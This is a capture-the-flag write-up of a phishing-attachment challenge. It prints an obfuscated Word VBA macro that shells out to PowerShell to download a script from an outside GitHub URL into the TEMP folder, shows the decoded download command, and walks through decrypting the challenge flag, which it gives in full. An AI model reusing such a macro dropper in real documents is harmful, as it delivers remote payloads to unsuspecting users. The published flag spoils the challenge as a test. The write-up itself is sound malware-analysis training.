# **Phish Trap**

## Description

One day, an employee received an email that appeared to be from ICE Corporation. The email seemed legitimate, but it included a file attachment that looked suspicious. Concerned about the risks, the employee decided not to open the file. Now, it’s up to you, the malware analyst, to investigate the file and figure out what it really does.

## Solution

You were given `.eml` file which consists of email contents such as text and attachment. You can open this file using Outlook if you are using Windows. There is one `docm` attachment that you can download. 

![image](https://github.com/user-attachments/assets/78e30575-370f-4720-ae02-95f60c630589)

If you try to open `.docm` file using Microsoft Word, it will give a warning about macros been blocked by Microsoft.  

A macro in a `.docm` file is like scripts written VBA code (Visual Basic for Applications) to perform repetitive tasks within Word. Since macros can execute code, they can also be used to carry out malicious actions, which makes `.docm` files a common format for phishing and malware attacks. 

![image](https://github.com/user-attachments/assets/af05e5ee-33a9-4402-bbfd-f9f72b70701c)

There is a tool called **Oletools** that is commonly used for malware analysis and digital forensics, especially when investigating malicious macros in Office documents.

```bash
olevba file.docm
```

You also can see the code by going to **`Developer**` > **`Visual Basic`** to open the VBA editor. 

The VBA code is obfuscated and maybe hard to interpret. You can ask ChatGPT to rename those variables and function names and explain what the script does. 

```visual-basic
Sub MkX7h29hLgB9wKvJ4pT6Zt()
    Dim Gr9Rj5TsY3Np4KwL8Xr2Fh As Variant
    Dim Az5Qf9Bl6MvTp3XuWoJd1Sg As String
    Dim Jw4Hq7VxIoLbKp2DvQy7CzN As Integer
    Dim Un7Pw9Gt8DhXzLfS3T5RvYn As String
    Dim Op9Fg3KlQ6Dp8V4LjPf7TxK As String
    Dim Xq2FqT8Yt7GqJr9HvL7FxTs As String

    Dim Rk9Ja3Cq7LxOi8Rz As Integer, Ty4Zu8Fp6BvQj3Hn As Integer
    Dim Vp5Zl9Ds1MvJr8Tk As String, Wf6Yg4HpAsNmQv7Bz As Variant
    Dim Ps1Uq8Rs9DjWv4Lk As Double

    Rk9Ja3Cq7LxOi8Rz = 18
    Ty4Zu8Fp6BvQj3Hn = 63
    Vp5Zl9Ds1MvJr8Tk = "Obfuscation Layer"
    Wf6Yg4HpAsNmQv7Bz = Array(4, 8, 3, 7, 6)

    Ps1Uq8Rs9DjWv4Lk = Rk9Ja3Cq7LxOi8Rz * Ty4Zu8Fp6BvQj3Hn / 2.718
    If Rk9Ja3Cq7LxOi8Rz > Ty4Zu8Fp6BvQj3Hn Then
        Vp5Zl9Ds1MvJr8Tk = "TestingLayer"
    Else
        Vp5Zl9Ds1MvJr8Tk = "ComplexLayer"
    End If

    Gr9Rj5TsY3Np4KwL8Xr2Fh = Array(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, _
                                    103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, _
                                    110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 105, 99, 101, _
                                    45, 97, 114, 105, 102, 112, 101, 121, 99, 97, 108, 47, 109, _
                                    97, 108, 105, 99, 105, 111, 117, 115, 45, 101, 110, 99, 114, _
                                    121, 112, 116, 47, 109, 97, 105, 110, 47, 69, 110, 99, 114, _
                                    121, 112, 116, 111, 114, 46, 112, 115, 49)

    Az5Qf9Bl6MvTp3XuWoJd1Sg = ""

    Dim LoopDummyZx8 As Integer
    For LoopDummyZx8 = 1 To 10
        Ps1Uq8Rs9DjWv4Lk = Ps1Uq8Rs9DjWv4Lk * LoopDummyZx8 - 1
    Next LoopDummyZx8

    For Jw4Hq7VxIoLbKp2DvQy7CzN = LBound(Gr9Rj5TsY3Np4KwL8Xr2Fh) To UBound(Gr9Rj5TsY3Np4KwL8Xr2Fh)
        Az5Qf9Bl6MvTp3XuWoJd1Sg = Az5Qf9Bl6MvTp3XuWoJd1Sg & Chr(Gr9Rj5TsY3Np4KwL8Xr2Fh(Jw4Hq7VxIoLbKp2DvQy7CzN))
    Next Jw4Hq7VxIoLbKp2DvQy7CzN

    Un7Pw9Gt8DhXzLfS3T5RvYn = Az5Qf9Bl6MvTp3XuWoJd1Sg
    
    Op9Fg3KlQ6Dp8V4LjPf7TxK = Environ("TEMP") & "\Encryptor.ps1"

    Xq2FqT8Yt7GqJr9HvL7FxTs = Left(Vp5Zl9Ds1MvJr8Tk, 5) & "-" & Right(Vp5Zl9Ds1MvJr8Tk, 3)
    
    Xq2FqT8Yt7GqJr9HvL7FxTs = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & Un7Pw9Gt8DhXzLfS3T5RvYn & "' -OutFile '" & Op9Fg3KlQ6Dp8V4LjPf7TxK & "'"""

    Shell Xq2FqT8Yt7GqJr9HvL7FxTs, vbNormalFocus
    
End Sub
```

TLDR:

1. `Gr9Rj5TsY3Np4KwL8Xr2Fh` is an array of ASCII values that, when converted to characters, form a URL. 
2. It will download `Encryptor.ps1` from 

https://raw.githubusercontent.com/ice-arifpeycal/malicious-encrypt/main/Encryptor.ps1   and put it in Temp directory.

1. Final PowerShell command looks like this:

```powershell
powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ice-arifpeycal/malicious-encrypt/main/Encryptor.ps1' -OutFile 'C:\Users\[UserName]\AppData\Local\Temp\Encryptor.ps1'"
```

The GitHub link will bring you to Encryptor.ps1. The script does several operations: 

1. Performs an XOR operation on two strings, combining them to generate a cryptographic key.
2. This key is then used in an AES encryption process, where the flag is encrypted using the key and an initialization vector (IV). 
3. Convert into base64 string. 
4. Shuffling the characters of the base64 result, making the output more difficult to interpret. 
5. Finally, the shuffled encrypted string is saved to a file, storing the transformed data in a file named "`flag1.txt.enc`". 

```powershell
$string1 = "IHopeThisIsSecureEnough"
$string2 = "GoodLuckDecrypting"

$bytes1 = [System.Text.Encoding]::UTF8.GetBytes($string1)
$bytes2 = [System.Text.Encoding]::UTF8.GetBytes($string2)

$length = [Math]::Max($bytes1.Length, $bytes2.Length)
$bytes1 = $bytes1 + (New-Object byte[] ($length - $bytes1.Length))
$bytes2 = $bytes2 + (New-Object byte[] ($length - $bytes2.Length))

$keyBytes = @()
for ($i = 0; $i -lt $length; $i++) {
    $keyBytes += $bytes1[$i] -bxor $bytes2[$i]
}

$key = $keyBytes[0..15]

$ivString = "ICECTF{not_flag}"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($ivString)

$IV = $ivBytes[0..15]

function Encrypt-String($plainText, $key, $IV) {
    $aes = [System.Security.Cryptography.Aes]::Create() 
    $aes.Key = $key 
    $aes.IV = $IV  
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV) 
    $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText) 
    $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length) 
    $aes.Dispose()  
    return [Convert]::ToBase64String($IV + $encryptedBytes)
}

$flagPart1 = ""
$encryptedFlagPart1 = Encrypt-String -plainText $flagPart1 -key $key -IV $IV

$charArray = $encryptedFlagPart1.ToCharArray()

for ($i = 0; $i -lt $charArray.Length - 1; $i += 2) {
    $temp = $charArray[$i]
    $charArray[$i] = $charArray[$i + 1]
    $charArray[$i + 1] = $temp
}

$shuffledFlag = -join $charArray

Set-Content -Path "flag1.txt.enc" -Value $shuffledFlag

# Changes: Remove flag2 due to security reasons. Will add encryption function in next update
```

In order to decrypt the flag, you need flag1.txt.enc file. But, where you can find it? It is actually inside the GitHub repository. 

[GitHub - ice-arifpeycal/malicious-encrypt](https://github.com/ice-arifpeycal/malicious-encrypt)

Now, you have all information to create a decrypt script. You can ask ChatGPT to create it for you.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode

def xor_strings(str1, str2):
    return bytes([a ^ b for a, b in zip(str1.encode(), str2.encode())])

def decrypt_string(encrypted_data, key, iv):
    encrypted_data = b64decode(encrypted_data)

    iv_from_data = encrypted_data[:16]  
    encrypted_content = encrypted_data[16:]  

    if iv_from_data != iv:
        raise ValueError("IV mismatch: Unable to decrypt.")

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = unpad(cipher.decrypt(encrypted_content), AES.block_size)

    return decrypted_bytes.decode('utf-8')

def unshuffle_string(shuffled_string):
    char_array = list(shuffled_string)
    for i in range(0, len(char_array) - 1, 2):
        char_array[i], char_array[i + 1] = char_array[i + 1], char_array[i]
    
    return ''.join(char_array)

string1 = "IHopeThisIsSecureEnough"
string2 = "GoodLuckDecrypting"

bytes1 = bytes(string1, 'utf-8')
bytes2 = bytes(string2, 'utf-8')

length = max(len(bytes1), len(bytes2))
bytes1 = bytes1 + b'\x00' * (length - len(bytes1))
bytes2 = bytes2 + b'\x00' * (length - len(bytes2))

key_bytes = bytearray([b1 ^ b2 for b1, b2 in zip(bytes1, bytes2)])
key = key_bytes[:16]  

iv_string = "ICECTF{not_flag}"
iv = bytes(iv_string, 'utf-8')[:16]  

encrypted_string = "USFN1QGR2ev5Fdm9GbnFXfK5nkOjBjeUpmCZMb6au+AODTwybJgb1m/6Zt8uJYVw"

unshuffled_string = unshuffle_string(encrypted_string)

try:
    decrypted_text = decrypt_string(unshuffled_string, key, iv)
    print("Decrypted Text:", decrypted_text)
except Exception as e:
    print("Decryption failed:", str(e))

# Decrypted Text: ICECTF{y0u_s33_1m_s0m3th1ng
```

Second part of flag is hinted inside `Encryptor.ps1` script. Seems like `flag2` had been removed from the current version of `Encryptor.ps1`.  Which means that `flag2` used to be here but in the previous versions. 

```powershell
# Changes: Remove flag2 due to security reasons. Will add encryption function in next update
```

In GitHub, you can check the previous commits and one of the commits contains the second part of flag.

![image](https://github.com/user-attachments/assets/7f756a84-b0cc-4077-9a21-e4ca69f55d25)

## Flag

ICECTF{y0u_s33_1m_s0m3th1ng_0f_4_m4lw4r3_4n4lyst_mys3lf}
